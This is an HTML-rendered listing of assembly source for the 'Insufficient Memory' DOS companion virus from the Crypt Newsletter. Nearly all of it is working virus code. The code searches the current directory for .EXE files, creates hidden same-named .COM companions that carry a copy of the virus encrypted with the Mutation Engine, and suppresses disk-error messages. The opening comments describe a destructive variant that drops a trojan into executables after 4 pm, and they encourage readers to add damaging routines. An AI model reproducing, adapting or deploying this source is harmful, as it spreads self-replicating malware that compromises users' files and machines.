<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>INSUFF.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;INSUFFICIENT MEMORY virus - by URNST KOUCH for Crypt Newsletter #6</span><span class="sc0">
</span><span class="sc1">;INSUFF MEMO is a simple MUTATION ENGINE loaded spawning virus, which </span><span class="sc0">
</span><span class="sc1">;confines itself to the current directory. To assemble with TASM 2.5, user</span><span class="sc0">
</span><span class="sc1">;must have complete MTE091B software package (including RND.OBJ,</span><span class="sc0">
</span><span class="sc1">;MTE.OBJ and stubfile, NOPS.BIN). Use MAKE2.BAT included in this</span><span class="sc0">
</span><span class="sc1">;issue of the Crypt Newsletter to assemble all proper</span><span class="sc0">
</span><span class="sc1">;components. Observant readers will notice INSUFF MEMO takes advantage of</span><span class="sc0">
</span><span class="sc1">;VCL 1.0 code as well as notation from the SARA virus.  INSUFF MEMO is</span><span class="sc0">
</span><span class="sc1">;a non-threatening, unique example of an MtE-loaded companion virus -</span><span class="sc0">
</span><span class="sc1">;the only one in circulation, in fact.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;INSUFF2, included as a DEBUG script in this newsletter, is functionally        </span><span class="sc0">
</span><span class="sc1">;identical to this virus.  However, for those who 'require' a destructive</span><span class="sc0">
</span><span class="sc1">;program for their full enjoyment, it is loaded with a routine which</span><span class="sc0">
</span><span class="sc1">;simple checks the system time and branches to some 'dropper' code if</span><span class="sc0">
</span><span class="sc1">;after quitting time (4:00 pm).  The 'dropper' reads from a data table</span><span class="sc0">
</span><span class="sc1">;and writes the NOIZ trojan to any .EXE in the current directory. By</span><span class="sc0">
</span><span class="sc1">;looking carefully at this code, several areas where 'potentially'</span><span class="sc0">
</span><span class="sc1">;destructive/nuisance routines can be added will suggest themselves.</span><span class="sc0">
</span><span class="sc1">;We do not include them for a number of reasons: 1) they are easy to</span><span class="sc0">
</span><span class="sc1">;come by in any number of books on assembly coding, the VCL 1.0 (an</span><span class="sc0">
</span><span class="sc1">;excellent source), or source code archives on mnay BBS's, and; 2)</span><span class="sc0">
</span><span class="sc1">;it allows you to get creative if you want and tinker (like I do all the</span><span class="sc0">
</span><span class="sc1">; time) with the basic layout of virus source.</span><span class="sc0">
</span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">;INSUFF3's source listing is modified to allow the virus to jump out        </span><span class="sc0">
</span><span class="sc1">;of the current directory when all files in it are infected.  The</span><span class="sc0">
</span><span class="sc1">;listing is publicly available at the BBS's listed at the end of the</span><span class="sc0">
</span><span class="sc1">;Crypt newsletter.</span><span class="sc0">

    </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">tiny</span><span class="sc0">
    </span><span class="sc9">.radix</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc9">.code</span><span class="sc0">

    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">mut_engine</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">rnd_buf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">data_top</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">

    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">locadr</span><span class="sc0">

</span><span class="sc5">reladr</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Insufficient memory'</span><span class="sc0">
    
</span><span class="sc5">locadr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;Calculate new CS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;A carry over from the DAV</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;SARA virus, something of a curiosity</span><span class="sc0">
                    </span><span class="sc1">;in this companion virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta_buf</span><span class="sc0">       </span><span class="sc1">;Set DTA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1a</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524</span><span class="sc0">                 </span><span class="sc1">;Hook INT 24, error handler</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">                      </span><span class="sc1">;see bottom of code</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fail_err</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;Initialize random seed for MtE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">rnd_buf</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;could be coded, mov  cs:[rnd_buf],0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">;process necessary for generation of</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;MtE encryption key - see MtE docs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">;for further notation</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">srchnam</span><span class="sc0">   </span><span class="sc1">;EXE file-mask for spawn-name search</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4e</span><span class="sc0">               </span><span class="sc1">; DOS find first file function</span><span class="sc0">
       
</span><span class="sc5">find_a_file</span><span class="sc4">:</span><span class="sc0">    
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infection_done</span><span class="sc0">          </span><span class="sc1">; Exit if no files found</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">                  </span><span class="sc1">; Infect the file!</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">infection_done</span><span class="sc0">          </span><span class="sc1">; Exit if no error</span><span class="sc0">
</span><span class="sc5">findr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc0">                 </span><span class="sc1">; DOS find next file function</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_a_file</span><span class="sc0">             </span><span class="sc1">; Try finding another file</span><span class="sc0">

    
</span><span class="sc5">infection_done</span><span class="sc4">:</span><span class="sc0"> 
     
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">                </span><span class="sc1">;terminate</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02Fh</span><span class="sc0">                 </span><span class="sc1">; DOS get DTA address function</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; DI points to the DTA</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01Eh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; SI points to file name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; DX points to file name, too</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">spawn_name</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc1">; DI points to new name</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; AH holds character count</span><span class="sc0">
</span><span class="sc5">transfer_loop</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; Load a character</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; Is it a NULL?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">transfer_end</span><span class="sc0">            </span><span class="sc1">; If so then leave the loop</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; Add one to the character count</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; Save the byte in the buffer</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">transfer_loop</span><span class="sc0">     </span><span class="sc1">; Repeat the loop</span><span class="sc0">
</span><span class="sc5">transfer_end</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">spawn_name</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc1">; First byte holds char. count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">13</span><span class="sc0">        </span><span class="sc1">; Make CR the final character</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; DI points to file name</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; CX holds length of filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                  </span><span class="sc1">; AL holds char. to search for</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                           </span><span class="sc1">; Search for a dot in the name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">      </span><span class="sc1">; Store "CO" as first two bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">   </span><span class="sc1">; Store "M" to make "COM"</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">set_carry</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Assume we'll fail</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03D00h</span><span class="sc0">               </span><span class="sc1">; DOS open file function, r/o</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">findr</span><span class="sc0">                   </span><span class="sc1">; File already exists, so leave</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">set_carry</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; Success -- the file is OK</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Ch</span><span class="sc0">                 </span><span class="sc1">; DOS create file function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100111b</span><span class="sc0">            </span><span class="sc1">; CX holds file attributes (all)</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; BX holds file handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_top</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">   </span><span class="sc1">; DX points to start of virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc1">; CX holds virus length for encryption </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">  </span><span class="sc1">;tells MtE decryption routine will</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">     </span><span class="sc1">;hand over control to where virus adds </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">;itself to 'infected' file, in this case offset  </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">;0100h .. set si/di to 0, bl to 0Fh, all required </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">101</span><span class="sc0">    </span><span class="sc1">;set bit-field in ax </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mut_engine</span><span class="sc0">   </span><span class="sc1">;call the Mutation Engine to do its thing</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">          </span><span class="sc1">;write encrypted virus to newly created file </span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Eh</span><span class="sc0">          </span><span class="sc1">;close the file </span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">set_carry</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">    
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infection_done</span><span class="sc0">            </span><span class="sc1">;move to end game</span><span class="sc0">

        

</span><span class="sc5">fail_err</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;Critical error handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;prevents virus from producing</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">                   </span><span class="sc1">;messages on write-protected disks.</span><span class="sc0">
                   </span><span class="sc1">;Not handed back to machine when virus exits.</span><span class="sc0">
</span><span class="sc5">srchnam</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;File-mask for 'spawn-search.'</span><span class="sc0">



    </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">dta_buf</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2bh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; Buffer for DTA</span><span class="sc0">
</span><span class="sc5">spawn_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">),</span><span class="sc2">13</span><span class="sc0">        </span><span class="sc1">; Name for next spawn</span><span class="sc0">
</span><span class="sc5">set_carry</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; Set-carry-on-exit flag</span><span class="sc0">
    
    </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
